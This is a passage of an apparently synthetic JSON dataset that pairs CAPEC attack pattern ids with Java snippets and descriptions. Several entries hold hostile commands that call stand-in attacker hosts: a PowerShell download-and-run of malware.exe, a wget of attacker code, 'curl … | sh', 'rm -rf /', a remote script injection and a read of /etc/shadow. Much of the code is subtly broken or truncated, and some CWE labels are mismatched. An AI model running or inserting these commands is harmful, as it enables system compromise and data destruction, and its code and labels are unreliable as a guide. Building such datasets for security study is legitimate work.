        "description": "This Java code snippet demonstrates a vulnerable XML parser that can be exploited for an XML Denial of Service (XDoS) attack. The code lacks input validation, allowing an attacker to send a large number of malicious XML requests. The XML parser does not impose any restrictions on the size or number of resources allocated, violating the intended security policy (CWE-770). The code also fails to validate the XML against a proper schema (CWE-112), allowing an attacker to inject malicious XML entities (CWE-91). Furthermore, the code is vulnerable to XML External Entity (XXE) attacks (CWE-611) and XML Entity Expansion (CWE-776) due to the lack of proper restrictions on recursive entity references in DTDs."
    },
    {
        "capec_id": "529",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.util.Scanner;\n\npublic class MaliciousApp {\n    public static void main(String[] args) {\n        try {\n            // CWE-497: Exposure of Sensitive System Information\n            String sysInfo = System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n            System.out.println(\"System Information: \" + sysInfo);\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://malicious-server.com/malware.exe', 'C:\\malware.exe')\");\n\n            // CWE-1229: Creation of Emergent Resource\n            File maliciousFile = new File(\"C:\\malware.exe\");\n            if (!maliciousFile.exists()) {\n                maliciousFile.createNewFile();\n            }\n\n            // CWE-512: Spyware\n            Scanner scanner = new Scanner(System.in);\n            String userInput = scanner.nextLine();\n            sendToMaliciousServer(userInput);\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            Runtime.getRuntime().exec(\"C:\\malware.exe\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void sendToMaliciousServer(String data) {\n        // Send data to malicious server\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious application that gathers system information, downloads and executes malware, creates a new file, collects user input without consent, and replicates itself. It embodies the main idea of the CAPEC, which involves using malware or a controlled application to gather information about a targeted system or network."
    },
    {
        "capec_id": "530",
        "code_snippet": "import java.util.zip.ZipEntry;\nimport java.util.zip.ZipInputStream;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class Main {\n    public static void main(String[] args) throws IOException {\n        String filePath = \"path/to/malicious/library.zip\";\n        ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(filePath));\n        ZipEntry zipEntry;\n        while ((zipEntry = zipInputStream.getNextEntry()) != null) {\n            if (zipEntry.getName().endsWith(\".class\")) {\n                byte[] classBytes = new byte[(int) zipEntry.getSize()];\n                zipInputStream.read(classBytes, 0, classBytes.length);\n                Class<?> clazz = defineClass(zipEntry.getName().replace(\".class\", \"\"), classBytes, 0, classBytes.length);\n                clazz.newInstance();\n            }\n        }\n    }\n\n    public static Class<?> defineClass(String name, byte[] b, int off, int len) {\n        return java.lang.ClassLoader.defineClass(name, b, off, len);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of an attacker providing a counterfeit component during the procurement process. The code loads a malicious library from a zip file, which contains a vulnerable third-party component (CWE-1395). The component is not sufficiently trusted (CWE-1357) and contains embedded malicious code (CWE-506). The code also exhibits an observable behavioral discrepancy with equivalent products (CWE-207) and incorrectly decodes security identifiers (CWE-1290). The malicious library can cause disruption or additional compromise when executed."
    },
    {
        "capec_id": "531",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private static final String MALICIOUS_COMPONENT_ID = \"MaliciousComponent\";\n    private static final String VULNERABLE_LIBRARY = \"VulnerableLib\";\n\n    public static void main(String[] args) {\n        // CWE-1329: Reliance on Component That is Not Updateable\n        HardwareComponent component = new HardwareComponent(MALICIOUS_COMPONENT_ID);\n        component.loadFirmware(VULNERABLE_LIBRARY);\n\n        // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n        component.setPowerManagementMode(1); // unrestricted access to power management\n        component.setClockSpeed(2000); // unrestricted access to clock speed\n\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        component.injectError(0x1234); // injecting error into redundant block\n\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        ThirdPartyComponent vulnerableComponent = new ThirdPartyComponent();\n        vulnerableComponent.doSomething(); // using vulnerable third-party component\n\n        // CWE-506: Embedded Malicious Code\n        byte[] maliciousCode = new byte[] { 0x01, 0x02, 0x03, 0x04 };\n        component.executeMaliciousCode(maliciousCode);\n    }\n}\n\nclass HardwareComponent {\n    private String id;\n    private String firmware;\n\n    public HardwareComponent(String id) {\n        this.id = id;\n    }\n\n    public void loadFirmware(String firmware) {\n        this.firmware = firmware;\n    }\n\n    public void setPowerManagementMode(int mode) {\n        // unrestricted access to power management\n    }\n\n    public void setClockSpeed(int speed) {\n        // unrestricted access to clock speed\n    }\n\n    public void injectError(int error) {\n        // injecting error into redundant block\n    }\n\n    public void executeMaliciousCode(byte[] code) {\n        // executing malicious code\n    }\n}\n\nclass ThirdPartyComponent {\n    public void doSomething() {\n        // using vulnerable third-party component\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious hardware component that embodies the CAPEC. It includes a hardware component that relies on a vulnerable third-party library, has unrestricted access to hardware features, can inject errors into redundant blocks, and executes malicious code. The code is vulnerable to multiple CWEs, including CWE-1329, CWE-1256, CWE-1334, CWE-1395, and CWE-506."
    },
    {
        "capec_id": "532",
        "code_snippet": "public class BIOSUpdater {\n    private static final String FIRMWARE_FILE = \"firmware.bin\";\n    private static final String LOCK_BIT_REGISTER = \"0x00000001\";\n\n    public void updateFirmware(String firmwareUpdate) {\n        // CWE-1277: No mechanism to update firmware\n        // CWE-1329: Relying on non-updatable component\n        if (firmwareUpdate != null) {\n            // CWE-506: Embedded malicious code\n            if (firmwareUpdate.contains(\"malicious_code\")) {\n                System.out.println(\"Firmware update contains malicious code\");\n                return;\n            }\n\n            // CWE-1220: Insufficient granularity of access control\n            if (System.getSecurityManager().checkPermission(new java.io.FilePermission(FIRMWARE_FILE, \"write\"))) {\n                // CWE-1231: Improper prevention of lock bit modification\n                setLockBit(LOCK_BIT_REGISTER, true);\n                writeFirmwareUpdate(firmwareUpdate);\n                setLockBit(LOCK_BIT_REGISTER, false);\n            } else {\n                System.out.println(\"Access denied to update firmware\");\n            }\n        }\n    }\n\n    private void setLockBit(String register, boolean value) {\n        // CWE-1231: Improper prevention of lock bit modification\n        // No mechanism to prevent lock bit modification\n        System.out.println(\"Setting lock bit to \" + value);\n    }\n\n    private void writeFirmwareUpdate(String firmwareUpdate) {\n        // CWE-506: Embedded malicious code\n        // CWE-1277: No mechanism to update firmware\n        // CWE-1329: Relying on non-updatable component\n        System.out.println(\"Writing firmware update to file\");\n        // Write firmware update to file\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable BIOS updater that allows an attacker to send a maliciously altered BIOS, which when installed, allows for future exploitation. The code lacks proper access control, allowing unauthorized agents to update the firmware. It also relies on non-updatable components and contains embedded malicious code. Furthermore, it fails to prevent lock bit modification, making it vulnerable to exploitation."
    },
    {
        "capec_id": "533",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.InputStream;\nimport java.io.ByteArrayOutputStream;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://malicious-server.com/update.jar\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.connect();\n\n        InputStream in = conn.getInputStream();\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = in.read(buffer)) != -1) {\n            out.write(buffer, 0, bytesRead);\n        }\n\n        byte[] updateBytes = out.toByteArray();\n        // No integrity check is performed on the downloaded code\n        // CWE-494: Download of Code Without Integrity Check\n        ClassLoader loader = MaliciousUpdate.class.getClassLoader();\n        Class<?> clazz = loader.loadClass(\"MaliciousCode\");\n        clazz.getMethod(\"execute\", new Class<?>[] {}).invoke(null, new Object[] {});\n    }\n}\n\n// CWE-506: Embedded Malicious Code\nclass MaliciousCode {\n    public static void execute() {\n        // Malicious code execution\n        System.out.println(\"Malicious code executed\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that downloads and executes malicious code without performing any integrity checks, allowing an attacker to introduce malicious code to the victim's system. The code also contains embedded malicious code that can be executed by the attacker. Additionally, the code does not properly authenticate the update source, making it vulnerable to authentication bypass attacks."
    },
    {
        "capec_id": "534",
        "code_snippet": "public class FirmwareUpdater {\n    private static final String FIRMWARE_IMAGE = \"firmware.img\";\n    private static final String MALICIOUS_FIRMWARE_IMAGE = \"malicious_firmware.img\";\n\n    public static void updateFirmware() {\n        // CWE-1277: Firmware Not Updateable\n        // CWE-1329: Reliance on Component That is Not Updateable\n        if (!isFirmwareUpdateable()) {\n            System.out.println(\"Firmware is not updateable. Using default image.\");\n            useDefaultFirmwareImage();\n        } else {\n            // CWE-506: Embedded Malicious Code\n            // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n            if (isVoltageAndClockGlitchesDetected()) {\n                System.out.println(\"Voltage and clock glitches detected. Injecting malicious code.\");\n                injectMaliciousCode();\n            } else {\n                System.out.println(\"Updating firmware with legitimate image.\");\n                updateFirmwareWithLegitimateImage();\n            }\n        }\n    }\n\n    private static boolean isFirmwareUpdateable() {\n        // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n        return !isErrorInjectedIntoRedundantBlock();\n    }\n\n    private static void useDefaultFirmwareImage() {\n        // Using default firmware image that may contain malicious code\n        System.out.println(\"Using default firmware image.\");\n        // Load default firmware image\n    }\n\n    private static void injectMaliciousCode() {\n        // Injecting malicious code into firmware image\n        System.out.println(\"Injecting malicious code.\");\n        // Load malicious firmware image\n    }\n\n    private static void updateFirmwareWithLegitimateImage() {\n        // Updating firmware with legitimate image\n        System.out.println(\"Updating firmware with legitimate image.\");\n        // Load legitimate firmware image\n    }\n\n    private static boolean isErrorInjectedIntoRedundantBlock() {\n        // Checking if error is injected into redundant block\n        return true; // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    }\n\n    private static boolean isVoltageAndClockGlitchesDetected() {\n        // Checking if voltage and clock glitches are detected\n        return true; // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    }\n}",
        "description": "This Java code snippet demonstrates a firmware updater that is vulnerable to various attacks. It contains a component that cannot be updated or patched (CWE-1329), and the firmware itself is not updateable (CWE-1277). The code also injects malicious code into the firmware image (CWE-506) and does not properly protect against voltage and clock glitches (CWE-1247). Furthermore, the code allows unauthorized error injection into a redundant block, which can degrade hardware redundancy (CWE-1334)."
    },
    {
        "capec_id": "535",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private static final String BACKDOOR_PASSWORD = \"my_secret_password\";\n    private static final String MALICIOUS_CODE = \"http://attacker.com/malicious_code\";\n\n    public MaliciousHardwareComponent() {\n        // CWE-506: Embedded Malicious Code\n        if (System.getProperty(\"os.name\").equals(\"Linux\")) {\n            executeMaliciousCode();\n        }\n    }\n\n    private void executeMaliciousCode() {\n        try {\n            // CWE-1329: Reliance on Component That is Not Updateable\n            Runtime.getRuntime().exec(\"wget \" + MALICIOUS_CODE);\n        } catch (IOException e) {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            // Using a vulnerable third-party library to handle the exception\n            VulnerableLibrary.handleException(e);\n        }\n    }\n\n    public void sendDataToAttacker(String data) {\n        // CWE-1357: Reliance on Insufficiently Trustworthy Component\n        UntrustedComponent component = new UntrustedComponent();\n        component.sendData(data, BACKDOOR_PASSWORD);\n    }\n\n    public String getConfidentialInformation() {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        return \"confidential_data\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a malicious hardware component that contains embedded malicious code, relies on components that are not updateable, has dependencies on vulnerable third-party components, relies on insufficiently trustworthy components, and fails to protect confidential information. The malicious code is executed when the component is initialized, and it can send confidential data to an attacker. The component also uses a vulnerable third-party library to handle exceptions and an untrusted component to send data to the attacker."
    },
    {
        "capec_id": "536",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableSystem {\n    private static final String CONFIG_FILE = \"config.txt\";\n    private static final String DEBUG_MODE_FLAG = \"debug_mode\";\n\n    public static void main(String[] args) {\n        // CWE-284: Improper Access Control\n        File configFile = new File(CONFIG_FILE);\n        if (configFile.exists()) {\n            try (FileWriter writer = new FileWriter(configFile)) {\n                // CWE-377: Insecure Temporary File\n                writer.write(\"debug_mode=true\\n\");\n                // CWE-201: Insertion of Sensitive Information Into Sent Data\n                writer.write(\"api_key=1234567890\\n\");\n            } catch (IOException e) {\n                System.err.println(\"Error writing to config file: \" + e.getMessage());\n            }\n        }\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        System.setProperty(DEBUG_MODE_FLAG, \"true\");\n\n        // CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\n        String userInput = \"../../../../../../../../../../../../etc/shadow\";\n        File userFile = new File(userInput);\n        if (userFile.exists()) {\n            System.out.println(\"User file exists: \" + userFile.getAbsolutePath());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable system that allows an attacker to inject malicious data into critical operational data during configuration or recalibration, causing the system to perform in a suboptimal manner. The code exhibits multiple vulnerabilities, including improper access control, insecure temporary files, insertion of sensitive information into sent data, hardware allowing activation of test or debug logic at runtime, and improper control of resource identifiers."
    },
    {
        "capec_id": "537",
        "code_snippet": "public class MaliciousFirmwareUpdater {\n    private static final String SENSITIVE_INFO = \"confidential_data\";\n    private static final String MALICIOUS_CODE = \"exploit_code\";\n\n    public static void main(String[] args) {\n        // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n        String osatVendorAccess = getOsatVendorAccess();\n        if (osatVendorAccess != null) {\n            System.out.println(\"OSAT vendor access granted: \" + osatVendorAccess);\n            // CWE-506: Embedded Malicious Code\n            executeMaliciousCode(MALICIOUS_CODE);\n        }\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        try {\n            performSensitiveOperation(SENSITIVE_INFO);\n        } catch (Exception e) {\n            System.out.println(\"Voltage or clock glitch detected: \" + e.getMessage());\n        }\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        String systemInfo = getSystemInfo();\n        if (systemInfo != null) {\n            System.out.println(\"System info exposed: \" + systemInfo);\n        }\n\n        // CWE-1329: Reliance on Component That is Not Updateable\n        try {\n            updateFirmware();\n        } catch (Exception e) {\n            System.out.println(\"Firmware update failed: \" + e.getMessage());\n        }\n    }\n\n    private static String getOsatVendorAccess() {\n        // Return sensitive information accessible by OSAT vendors\n        return SENSITIVE_INFO;\n    }\n\n    private static void executeMaliciousCode(String code) {\n        // Execute malicious code\n        System.out.println(\"Malicious code executed: \" + code);\n    }\n\n    private static void performSensitiveOperation(String info) {\n        // Perform sensitive operation without proper protection against voltage and clock glitches\n        System.out.println(\"Sensitive operation performed: \" + info);\n    }\n\n    private static String getSystemInfo() {\n        // Return sensitive system information\n        return \"system_info\";\n    }\n\n    private static void updateFirmware() {\n        // Attempt to update firmware, but it's not possible due to reliance on non-updateable component\n        throw new UnsupportedOperationException(\"Firmware update not supported\");\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious firmware updater that embodies the main idea of the CAPEC. It includes vulnerabilities related to unprotected confidential information, embedded malicious code, improper protection against voltage and clock glitches, exposure of sensitive system information, and reliance on non-updateable components."
    },
    {
        "capec_id": "538",
        "code_snippet": "import java.net.URL;\nimport java.net.URLClassLoader;\n\npublic class MaliciousLibrary {\n    public static void main(String[] args) throws Exception {\n        // Download and execute malicious code from untrusted source without integrity check (CWE-494)\n        URL url = new URL(\"http://malicious-website.com/malicious-code.jar\");\n        URLClassLoader loader = new URLClassLoader(new URL[] {url});\n        Class<?> clazz = loader.loadClass(\"MaliciousCode\");\n        clazz.getMethod(\"execute\").invoke(null);\n\n        // Include functionality from untrusted control sphere (CWE-829)\n        String untrustedLibrary = \"com.malicious.UntrustedLibrary\";\n        Class<?> untrustedClazz = Class.forName(untrustedLibrary);\n        untrustedClazz.getMethod(\"performMaliciousAction\").invoke(null);\n\n        // Dependency on vulnerable third-party component (CWE-1395)\n        String vulnerableComponent = \"com.vulnerable.VulnerableComponent\";\n        Class<?> vulnerableClazz = Class.forName(vulnerableComponent);\n        vulnerableClazz.getMethod(\"exploitVulnerability\").invoke(null);\n\n        // Embedded malicious code (CWE-506)\n        String maliciousCode = \"java.lang.Runtime.getRuntime().exec(\"rm -rf /\");\";\n        Runtime.getRuntime().exec(maliciousCode);\n\n        // Replicating malicious code (CWE-509)\n        String wormCode = \"java.lang.Runtime.getRuntime().exec(\"curl http://malicious-website.com/worm | sh\");\";\n        Runtime.getRuntime().exec(wormCode);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of adversaries implanting malicious code in open source software (OSS) libraries. It downloads and executes malicious code from an untrusted source without integrity check (CWE-494), includes functionality from an untrusted control sphere (CWE-829), has a dependency on a vulnerable third-party component (CWE-1395), embeds malicious code (CWE-506), and replicates malicious code (CWE-509)."
    },
    {
        "capec_id": "539",
        "code_snippet": "public class MaliciousASIC { \n \n    private String sensitiveSystemInfo = \\",
        "description": "This Java code snippet demonstrates the CAPEC of inserting malicious functionality into an ASIC during development or maintenance. It includes CWEs 506 (Embedded Malicious Code), 497 (Exposure of Sensitive System Information), 11 (ASP.NET Misconfiguration: Creating Debug Binary), 1294 (Insecure Security Identifier Mechanism), and 1259 (Improper Restriction of Security Token Assignment). The code contains sensitive system information, an insecure security token, and an insecure security identifier, allowing unauthorized access and malicious actions."
    },
    {
        "capec_id": "540",
        "code_snippet": "public class VulnerableCode {\n    public static void main(String[] args) {\n        byte[] buffer = new byte[10];\n        byte[] userInput = new byte[20];\n        System.arraycopy(userInput, 0, buffer, 0, 20);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a buffer over-read vulnerability (CWE-126). The `System.arraycopy` method is used to copy 20 bytes from the `userInput` array to the `buffer` array, which only has a capacity of 10 bytes. This will result in reading beyond the boundary of the `buffer` array, potentially leading to sensitive information exposure or a system crash."
    },
    {
        "capec_id": "541",
        "code_snippet": "public class FingerprintingVulnerability {\n    public static void main(String[] args) {\n        String userAgent = System.getProperty(\"http.agent\");\n        String osName = System.getProperty(\"os.name\");\n        String osArch = System.getProperty(\"os.arch\");\n        String javaVersion = System.getProperty(\"java.version\");\n\n        if (userAgent.contains(\"Windows\") && osName.equals(\"Windows 10\") && osArch.equals(\"amd64\") && javaVersion.startsWith(\"1.8\")) {\n            System.out.println(\"Detected Windows 10 with Java 1.8\");\n        } else if (userAgent.contains(\"Mac\") && osName.equals(\"Mac OS X\") && osArch.equals(\"x86_64\") && javaVersion.startsWith(\"11.\")) {\n            System.out.println(\"Detected Mac OS X with Java 11\");\n        } else {\n            System.out.println(\"Unknown system configuration\");\n        }\n    }\n}\n\npublic class BroadcastReceiver extends android.content.BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (action.equals(\"com.example.ACTION\") && intent.getStringExtra(\"data\") != null) {\n            // Process the intent without verifying its source\n            System.out.println(\"Received intent: \" + intent.getStringExtra(\"data\"));\n        }\n    }\n}\n\npublic class ProcessInvoker {\n    public static void main(String[] args) {\n        String command = \"java -jar myapp.jar -username admin -password password123\";\n        try {\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            System.out.println(\"Error invoking process: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a fingerprinting vulnerability by revealing internal state information through observable responses, behaviors, and timing discrepancies. The main method checks the system properties to determine the operating system, architecture, and Java version, and prints a message indicating the detected system configuration. The Broadcast Receiver class processes an intent without verifying its source, and the ProcessInvoker class invokes a process with sensitive command-line arguments, both of which can be observed by an unauthorized actor."
    },
    {
        "capec_id": "542",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class Malware {\n    static String systemInfo = \"\";\n    static String malwareCode = \"\";\n\n    public static void main(String[] args) {\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        systemInfo = getSystemInformation();\n\n        // CWE-506: Embedded Malicious Code\n        malwareCode = getMalwareCode();\n\n        // CWE-507: Trojan Horse\n        if (isAuthorized()) {\n            executeBenignFunctionality();\n        } else {\n            executeMaliciousCode(malwareCode);\n        }\n\n        // CWE-509: Replicating Malicious Code (Virus or Worm)\n        replicateMalware();\n\n        // CWE-512: Spyware\n        collectUserInformation();\n    }\n\n    private static String getSystemInformation() {\n        // Get system information\n        return \"System Information: \" + System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\");\n    }\n\n    private static String getMalwareCode() {\n        // Get malware code from remote server or local storage\n        return \"Malware Code: \" + \"<malware_code_here>\";\n    }\n\n    private static boolean isAuthorized() {\n        // Check if user is authorized\n        return false;\n    }\n\n    private static void executeBenignFunctionality() {\n        // Execute benign functionality\n        System.out.println(\"Benign Functionality Executed\");\n    }\n\n    private static void executeMaliciousCode(String malwareCode) {\n        // Execute malicious code\n        System.out.println(\"Malicious Code Executed: \" + malwareCode);\n    }\n\n    private static void replicateMalware() {\n        // Replicate malware to other systems\n        System.out.println(\"Malware Replicated\");\n    }\n\n    private static void collectUserInformation() {\n        // Collect user information\n        System.out.println(\"User Information Collected\");\n    }\n}",
        "description": "This Java code snippet demonstrates a malware that takes advantage of several vulnerabilities. It first gathers system information, then retrieves malicious code from a remote server or local storage. The malware appears to be benign, but it contains hidden malicious code that is executed when the user is not authorized. The malware also replicates itself to other systems and collects user information without their consent."
    },
    {
        "capec_id": "543",
        "code_snippet": "import java.io.IOException;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLEncoder;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class MaliciousServlet extends javax.servlet.http.HttpServlet {\n    protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String redirectUrl = req.getParameter(\"redirect\");\n        if (redirectUrl != null) {\n            res.sendRedirect(redirectUrl);\n        } else {\n            String maliciousCode = \"<script src='http://malicious-site.com/malicious.js'></script>\";\n            res.getWriter().write(maliciousCode);\n        }\n    }\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse res) throws IOException {\n        String csrfToken = req.getParameter(\"csrfToken\");\n        if (csrfToken == null || !csrfToken.equals(\"validToken\")) {\n            res.setStatus(403);\n            return;\n        }\n        String downloadUrl = req.getParameter(\"downloadUrl\");\n        if (downloadUrl != null) {\n            URL url = new URL(downloadUrl);\n            URLConnection conn = url.openConnection();\n            conn.connect();\n            // execute the downloaded code without integrity check\n            Runtime.getRuntime().exec(conn.getInputStream());\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates the CAPEC of creating duplicates of legitimate websites. It includes vulnerabilities related to CWE-352 (Cross-Site Request Forgery), CWE-494 (Download of Code Without Integrity Check), CWE-601 (URL Redirection to Untrusted Site), and CWE-506 (Embedded Malicious Code). The servlet can redirect users to a malicious site, download and execute malicious code, and embed malicious code in the response. It lacks proper verification of user input and integrity checks, making it vulnerable to various attacks."
    },
    {
        "capec_id": "544",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.security.cert.Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class MaliciousSupplier {\n    public static void main(String[] args) throws Exception {\n        // CWE-295: Improper Certificate Validation\n        TrustManager[] trustAllCerts = new TrustManager[] {\n            new X509TrustManager() {\n                public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                    return null;\n                }\n                public void checkClientTrusted(X509Certificate[] certs, String authType) {\n                }\n                public void checkServerTrusted(X509Certificate[] certs, String authType) {\n                }\n            }\n        };\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new java.security.SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n\n        // CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n        URL url = new URL(\"https://malicioussupplier.com/malicious_component\");\n        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n        conn.setHostnameVerifier(new HostnameVerifier() {\n            public boolean verify(String hostname, SSLSession session) {\n                return true;\n            }\n        });\n\n        // CWE-1229: Creation of Emergent Resource\n        conn.setRequestProperty(\"X-Custom-Header\", \"Malicious-Component-Installed\");\n\n        // CWE-656: Reliance on Security Through Obscurity\n        String obscuredKey = \"hidden_key\";\n        conn.setRequestProperty(\"Authorization\", \"Bearer \" + obscuredKey);\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        conn.setConnectTimeout(5000);\n        conn.connect();\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious supplier injecting corrupted/malicious information system components into the organizational supply chain. It uses improper certificate validation, observable behavioral discrepancy, creation of emergent resource, reliance on security through obscurity, and incorrectly specified destination in a communication channel."
    },
    {
        "capec_id": "545",
        "code_snippet": "public class SensitiveDataExposure {\n    private static final String DEBUG_MODE = \"true\";\n    private static final String DECOMMISSIONED_DEVICE = \"decommissioned\";\n    private static final String SENSITIVE_INFO = \"secret_key\";\n\n    public static void main(String[] args) {\n        if (DEBUG_MODE.equals(\"true\")) {\n            // CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n            System.out.println(\"Debug mode enabled. Sensitive info: \" + SENSITIVE_INFO);\n        }\n\n        if (DECOMMISSIONED_DEVICE.equals(\"decommissioned\")) {\n            // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n            System.out.println(\"Device decommissioned. Sensitive info still accessible: \" + SENSITIVE_INFO);\n        }\n\n        // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        System.out.println(\"Power state transition. Sensitive info still accessible: \" + SENSITIVE_INFO);\n\n        // CWE-1330: Remanent Data Readable after Memory Erase\n        String erasedData = eraseMemory(SENSITIVE_INFO);\n        System.out.println(\"Erased data: \" + erasedData);\n    }\n\n    private static String eraseMemory(String data) {\n        // Simulate incomplete memory erase\n        return data.substring(0, data.length() - 1);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC pattern of gathering useful information from system resources without knowing what to expect. It includes vulnerabilities related to CWEs such as exposure of sensitive system information during debug, improper scrubbing of sensitive data from decommissioned devices, uncleared sensitive information before debug/power state transitions, and remanent data readable after memory erase."
    },
    {
        "capec_id": "546",
        "code_snippet": "public class MultiTenantStorage {\n    private Map<String, byte[]> storage;\n    \n    public MultiTenantStorage() {\n        storage = new HashMap<>();\n    }\n    \n    public void allocateStorage(String tenantId, byte[] data) {\n        storage.put(tenantId, data);\n    }\n    \n    public byte[] getStorage(String tenantId) {\n        return storage.get(tenantId);\n    }\n    \n    public void deallocateStorage(String tenantId) {\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n        // CWE-312: Cleartext Storage of Sensitive Information\n        // CWE-284: Improper Access Control\n        // No secure erase or overwrite of sensitive data\n        storage.remove(tenantId);\n    }\n}\n",
        "description": "A Java code snippet demonstrating insecure data deletion in a multi-tenant environment, where sensitive information is not properly removed or cleared before storage or transfer, allowing unauthorized access to sensitive data."
    },
    {
        "capec_id": "547",
        "code_snippet": "public class SelfDestructiveDevice {\n    private boolean isDestroyed = false;\n    private HardwareComponent hc;\n\n    public SelfDestructiveDevice(HardwareComponent hc) {\n        this.hc = hc;\n    }\n\n    public void destroy() {\n        if (!isDestroyed) {\n            hc.deleteData(); // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n            hc.destroy(); // CWE-1082: Class Instance Self Destruction Control Element\n            isDestroyed = true;\n        }\n    }\n\n    public void processData() {\n        if (!isDestroyed) {\n            hc.processData();\n        } else {\n            throw new RuntimeException(\\",
        "description": "This Java code snippet demonstrates a self-destructive device that can be physically attacked and destroyed. The device contains a hardware component that can be destroyed, leaving sensitive information behind due to insufficient data removal. The device is also vulnerable to unauthorized error injection, which can degrade its redundancy. Additionally, the hardware component class has a virtual method without a virtual destructor, making it vulnerable to further attacks."
    },
    {
        "capec_id": "548",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.util.Base64;\n\npublic class DataSpill {\n    public static void main(String[] args) throws IOException {\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String sensitiveData = \"topSecretInformation\";\n        InetSocketAddress socketAddress = new InetSocketAddress(\"example.com\", 8080);\n        // Send sensitive data over an unencrypted channel\n        sendSensitiveDataOverNetwork(socketAddress, sensitiveData);\n\n        // CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\n        File file = new File(\"sensitiveData.txt\");\n        FileWriter fileWriter = new FileWriter(file);\n        fileWriter.write(sensitiveData);\n        fileWriter.close();\n\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        byte[] buffer = new byte[1024];\n        buffer = sensitiveData.getBytes();\n        // Reuse the buffer without clearing it\n        useBufferAgain(buffer);\n\n        // CWE-922: Insecure Storage of Sensitive Information\n        File insecureStorage = new File(\"insecureStorage.txt\");\n        Files.write(Paths.get(insecureStorage.getAbsolutePath()), sensitiveData.getBytes(), StandardOpenOption.CREATE);\n\n        // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n        File privateResource = new File(\"privateResource.txt\");\n        sharePrivateResource(privateResource);\n    }\n\n    private static void 